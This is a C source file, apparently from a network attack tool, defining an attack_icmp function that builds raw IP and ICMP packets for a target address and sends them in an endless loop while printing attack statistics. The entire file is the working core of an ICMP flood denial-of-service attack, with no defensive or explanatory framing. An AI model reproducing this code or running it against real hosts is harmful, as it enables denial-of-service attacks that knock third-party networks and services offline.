#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "tcp_attack.h"
#include "packet.h"
#include "utils.h"
#include "types.h"

void attack_icmp(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct icmp_hdr *icmph = (struct icmp_hdr *)(buffer + sizeof(struct ip_hdr));
	struct sockaddr_in target_addr;
	struct attack_info info;

	seed_rand(time(NULL));

	target_addr.sin_family = AF_INET;
	target_addr.sin_port = 0;
	target_addr.sin_addr.s_addr = target->address;
	target->sockfd = init_socket(IPPROTO_ICMP);

	init_attack_info(target, &info);
	print_attack_header(&info);

	while (1) {
		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct icmp_hdr),
			IPPROTO_ICMP, target->address);
		build_icmp(icmph);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target_addr,
				sizeof(struct sockaddr_in)) == -1) {
			info.packets_fail++;
		} else {
			info.packets_send++;
			info.total_size += iph->length;
		}
		print_attack_info(&info);
	}
}
